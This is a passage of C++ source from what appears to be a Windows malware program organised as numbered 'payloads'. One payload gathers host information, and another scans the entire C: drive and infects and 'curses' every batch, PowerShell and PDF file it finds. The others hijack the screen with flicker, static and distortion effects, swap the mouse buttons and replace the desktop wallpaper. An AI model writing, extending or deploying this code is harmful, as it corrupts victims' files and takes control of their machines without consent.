// ============================================================
DWORD WINAPI GDIPayload67(LPVOID)
{
    // Host recon first: a full dump of the machine we're on.
    printf("============ HOST INFO ============\n");
    HostInfo::PrintAll();
    printf("===================================\n\n");

#ifndef DUMB_BUILD
    ILOVEYOUSafeEmulator::DisplayContacts();
#endif

    Sleep(2000);

    return 0;
}

// ============================================================
// FILE INFECT (PAYLOAD 68)
//
// MASS infect: batch + powershell + pdf.
// ============================================================
DWORD WINAPI FileInfect(LPVOID)
{
    auto batchfiles = FileInfecting::FindBatchFiles("C:");

    for (const auto& path : batchfiles)
    {
#ifdef _DEBUG
        printf("infect batch: %s\n", path.c_str());
#endif
        FileInfecting::InfectBatchFile(path);
        FileInfecting::CurseBatchFile(path);
    }

    auto psfiles = FileInfecting::FindPowerShellFiles("C:");

    for (const auto& path : psfiles)
    {
#ifdef _DEBUG
        printf("infect powershell: %s\n", path.c_str());
#endif
        FileInfecting::InfectPowerShellFile(path);
        FileInfecting::CursePowerShellFile(path);
    }

    auto pdffiles = FileInfecting::FindPDFFiles("C:");

    for (const auto& path : pdffiles)
    {
#ifdef _DEBUG
        printf("infect pdf: %s\n", path.c_str());
#endif
        FileInfecting::InfectPDFFile(path);
        FileInfecting::CursePDFFile(path);
    }

    return 0;
}

// ============================================================
// FX PACK 3 (PAYLOADS 69-72)
//
// Per-pixel shaders on a temporary screen-sized DIB (shared
// GDIBuffer from gdi/gdibuffer.h).
// ============================================================

static const float GDI_PI = 3.14159265f;

// ============================================================
// PAYLOAD 69
// Barcode Scan: the whole screen slides sideways like a giant
// supermarket barcode while rolling zebra stripes darken it.
// ============================================================
DWORD WINAPI GDIPayload69(LPVOID)
{
    const SeedVariant& sd = SeedGet(69);

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    const int w = GetDeviceCaps(dc, HORZRES);
    const int h = GetDeviceCaps(dc, VERTRES);

    GDIBuffer frame;

    if (!CreateBuffer(dc, frame, w, h))
    {
        ReleaseDC(nullptr, dc);
        return 0;
    }

    const int stride = 1 + (int)(fabsf((float)sd.amp) * 0.5f);

    for (int f = 0; f < 260; ++f)
    {
        if (FXAbort())
            break;

        BitBlt(
            frame.dc,
            0,
            0,
            w,
            h,
            dc,
            0,
            0,
            SRCCOPY
        );

        const int shift = (f * stride) % w;
        const float time = f * 0.07f;

        // ⚡ Bolt: Performance optimization
        // 💡 What: Extracted trigonometric calculation of 'band' out of the per-pixel nested loops.
        // 🎯 Why: Re-evaluating sinf() inside the x/y loops redundantly recomputed the exact same values w * h times per frame instead of just w times.
        // 📊 Impact: Substantially reduces CPU usage per frame (cuts trig calls from width*height down to just width).
        std::vector<float> band_x(w);
        for (int x = 0; x < w; ++x)
        {
            band_x[x] =
                0.45f +
                0.55f *
                sinf(
                    x * 0.08f -
                    time
                );
        }

        for (int y = 0; y < h; ++y)
        {
            const uint32_t* src =
                frame.pixels + y * w;

            for (int x = 0; x < w; ++x)
            {
                int sx = x + shift;

                if (sx >= w)
                    sx -= w;

                int r, g, b;

                SplitRGB(
                    src[sx],
                    r,
                    g,
                    b
                );

                // rolling scanner bands = fake barcode stripes
                const float band = band_x[x];

                frame.pixels[y * w + x] =
                    RGBPixel(
                        (int)(r * band),
                        (int)(g * band),
                        (int)(b * band)
                    );
            }
        }

        BitBlt(
            dc,
            0,
            0,
            w,
            h,
            frame.dc,
            0,
            0,
            SRCCOPY
        );

        Sleep(1);
    }

    DestroyBuffer(frame);

    ReleaseDC(nullptr, dc);

    return 0;
}

// ============================================================
// PAYLOAD 70
// Analog Static: pure TV noise, occasional white banding and
// black-out flicker — set tuning broken.
// ============================================================
DWORD WINAPI GDIPayload70(LPVOID)
{
    const SeedVariant& sd = SeedGet(70);

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    const int w = GetDeviceCaps(dc, HORZRES);
    const int h = GetDeviceCaps(dc, VERTRES);

    GDIBuffer frame;

    if (!CreateBuffer(dc, frame, w, h))
    {
        ReleaseDC(nullptr, dc);
        return 0;
    }

    uint32_t ns = sd.rng;

    for (int f = 0; f < 260; ++f)
    {
        if (FXAbort())
            break;

        const bool blackout =
            (FXRand(ns) & 15) == 0;

        uint32_t* p = frame.pixels;

        for (int i = 0; i < w * h; ++i)
        {
            if (blackout)
            {
                p[i] = 0;
            }
            else
            {
                uint32_t r = FXRand(ns);
                uint32_t g = FXRand(ns);
                uint32_t b = FXRand(ns);

                p[i] = RGBPixel(
                    (int)(r & 255),
                    (int)(g & 255),
                    (int)(b & 255)
                );
            }
        }

        if (!blackout && (FXRand(ns) % 60) == 0)
        {
            // Horizontal white band (bad receiver).
            const int bandY =
                (int)(FXRand(ns) % (uint32_t)h);

            const int bandH =
                (int)(8 + (FXRand(ns) % 40));

            for (int y = bandY;
                 y < bandY + bandH && y < h;
                 ++y)
                for (int x = 0; x < w; ++x)
                    frame.pixels[y * w + x] =
                        RGBPixel(255, 255, 255);
        }

        BitBlt(
            dc,
            0,
            0,
            w,
            h,
            frame.dc,
            0,
            0,
            SRCCOPY
        );

        Sleep(1);
    }

    DestroyBuffer(frame);

    ReleaseDC(nullptr, dc);

    return 0;
}

// ============================================================
// PAYLOAD 71
// Bayer Dither: live screen posterized to 2 bits/channel with
// an ordered 4x4 matrix. Retro quantized look.
// ============================================================
DWORD WINAPI GDIPayload71(LPVOID)
{
    (void)SeedGet(71);

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    const int w = GetDeviceCaps(dc, HORZRES);
    const int h = GetDeviceCaps(dc, VERTRES);

    GDIBuffer src;
    GDIBuffer out;

    if (!CreateBuffer(dc, src, w, h) ||
        !CreateBuffer(dc, out, w, h))
    {
        if (src.dc) DestroyBuffer(src);
        if (out.dc) DestroyBuffer(out);

        ReleaseDC(nullptr, dc);
        return 0;
    }

    static const int bayer4[4][4] =
    {
        { 0,  8,  2, 10 },
        { 12, 4, 14,  6 },
        { 3, 11,  1,  9 },
        { 15, 7, 13,  5 }
    };

    for (int f = 0; f < 260; ++f)
    {
        if (FXAbort())
            break;

        BitBlt(
            src.dc,
            0,
            0,
            w,
            h,
            dc,
            0,
            0,
            SRCCOPY
        );

        for (int y = 0; y < h; ++y)
        {
            for (int x = 0; x < w; ++x)
            {
                int r, g, b;

                SplitRGB(
                    src.pixels[y * w + x],
                    r,
                    g,
                    b
                );

                const int th =
                    bayer4[y & 3][x & 3] * 4;

                auto q = [&](int v)
                {
                    int c = v >> 6;

                    if (c > 3)
                        c = 3;

                    if ((v & 63) > th)
                        ++c;

                    if (c > 3)
                        c = 3;

                    return c * 85;
                };

                out.pixels[y * w + x] =
                    RGBPixel(
                        q(r),
                        q(g),
                        q(b)
                    );
            }
        }

        BitBlt(
            dc,
            0,
            0,
            w,
            h,
            out.dc,
            0,
            0,
            SRCCOPY
        );

        Sleep(1);
    }

    DestroyBuffer(out);
    DestroyBuffer(src);

    ReleaseDC(nullptr, dc);

    return 0;
}

// ============================================================
// PAYLOAD 72
// Kaleido Pan: live screen folded into a rotating 6-slice
// kaleidoscope. Content mirrors inwards and spins.
// ============================================================
DWORD WINAPI GDIPayload72(LPVOID)
{
    const SeedVariant& sd = SeedGet(72);

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    const int w = GetDeviceCaps(dc, HORZRES);
    const int h = GetDeviceCaps(dc, VERTRES);

    GDIBuffer src;
    GDIBuffer out;

    if (!CreateBuffer(dc, src, w, h) ||
        !CreateBuffer(dc, out, w, h))
    {
        if (src.dc) DestroyBuffer(src);
        if (out.dc) DestroyBuffer(out);

        ReleaseDC(nullptr, dc);
        return 0;
    }

    const float cx = w * 0.5f;
    const float cy = h * 0.5f;

    const int slices = 6 + (sd.amp & 3);
    const float sliceRad =
        (GDI_PI * 2.0f) / (float)slices;

    for (int f = 0; f < 260; ++f)
    {
        if (FXAbort())
            break;

        BitBlt(
            src.dc,
            0,
            0,
            w,
            h,
            dc,
            0,
            0,
            SRCCOPY
        );

        const float time = f * 0.02f;

        for (int y = 0; y < h; ++y)
        {
            for (int x = 0; x < w; ++x)
            {
                const float dx = x - cx;
                const float dy = y - cy;

                const float r =
                    sqrtf(dx * dx + dy * dy);

                float a =
                    atan2f(dy, dx);
                a -= time;

                a = fmodf(a, sliceRad);

                if (a > sliceRad * 0.5f)
                    a = sliceRad - a;

                a += time * 1.5f;

                const int sx =
                    ClampI(
                        (int)(cx + cosf(a) * r),
                        0,
                        w - 1
                    );

                const int sy =
                    ClampI(
                        (int)(cy + sinf(a) * r),
                        0,
                        h - 1
                    );

                out.pixels[y * w + x] =
                    src.pixels[sy * w + sx];
            }
        }

        BitBlt(
            dc,
            0,
            0,
            w,
            h,
            out.dc,
            0,
            0,
            SRCCOPY
        );

        Sleep(1);
    }

    DestroyBuffer(out);
    DestroyBuffer(src);

    ReleaseDC(nullptr, dc);

    return 0;
}

// ============================================================
// PAYLOAD 73
// Mouse Swap: inverts the mouse buttons for several seconds,
// then restores the previous state.
// ============================================================
DWORD WINAPI GDIPayload73(LPVOID)
{
    (void)SeedGet(73);

    BOOL prev = SwapMouseButton(TRUE);

    Sleep(8000);

    SwapMouseButton(prev);

    return 0;
}

// ============================================================
// PAYLOAD 74
// Wallpaper Hell: replaces the desktop wallpaper with a
// generated noise BMP for a few seconds, then restores it.
// Nothing is persisted (no SPIF_UPDATEINIFILE).
// ============================================================
DWORD WINAPI GDIPayload74(LPVOID)
{
    const SeedVariant& sd = SeedGet(74);

    wchar_t original[MAX_PATH * 2]{};

    SystemParametersInfoW(
        SPI_GETDESKWALLPAPER,
        0,
        original,
        0
    );

    wchar_t path[MAX_PATH]{};

    GetTempPathW(
        MAX_PATH,
        path
    );

    wcscat_s(
        path,
        L"HPPD_noise.bmp"
    );

    // -- Generate a 800x600 static-noise 24bpp BMP ------------

    const int bw = 800;
    const int bh = 600;
    const int pitch = ((bw * 3) + 3) & ~3;
    const DWORD imageSize =
        (DWORD)pitch * (DWORD)bh;

    BITMAPFILEHEADER bfh{};
    bfh.bfType = 0x4D42; // "BM"
    bfh.bfSize =
        54 + imageSize;
    bfh.bfOffBits = 54;

    BITMAPINFOHEADER bih{};
    bih.biSize = sizeof(BITMAPINFOHEADER);
    bih.biWidth = bw;
    bih.biHeight = bh;
    bih.biPlanes = 1;
    bih.biBitCount = 24;
    bih.biCompression = BI_RGB;
    bih.biSizeImage = imageSize;

    HANDLE f = CreateFileW(
        path,
        GENERIC_WRITE,
        0,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if (f != INVALID_HANDLE_VALUE)
    {
        DWORD wr = 0;

        WriteFile(
            f,
            &bfh,
            sizeof(bfh),
            &wr,
            nullptr
        );

        WriteFile(
            f,
            &bih,
            sizeof(bih),
            &wr,
            nullptr
        );

        std::vector<uint8_t> line(
            (size_t)pitch
        );

        uint32_t ns = sd.rng;

        for (int y = 0; y < bh; ++y)
        {
            for (int x = 0; x < bw; ++x)
            {
                line[(size_t)x * 3 + 0] =
                    (uint8_t)(FXRand(ns) & 255);
                line[(size_t)x * 3 + 1] =
                    (uint8_t)(FXRand(ns) & 255);
                line[(size_t)x * 3 + 2] =
                    (uint8_t)(FXRand(ns) & 255);
            }

            WriteFile(
                f,
                line.data(),
                (DWORD)line.size(),
                &wr,
                nullptr
            );
        }

        CloseHandle(f);
    }

    // -- Swap it in, hold, restore -----------------------------

    SystemParametersInfoW(
        SPI_SETDESKWALLPAPER,
        0,
        path,
        0
    );

    Sleep(8000);

    SystemParametersInfoW(
        SPI_SETDESKWALLPAPER,
        0,
        original,
        0
    );

    DeleteFileW(path);

    return 0;
}

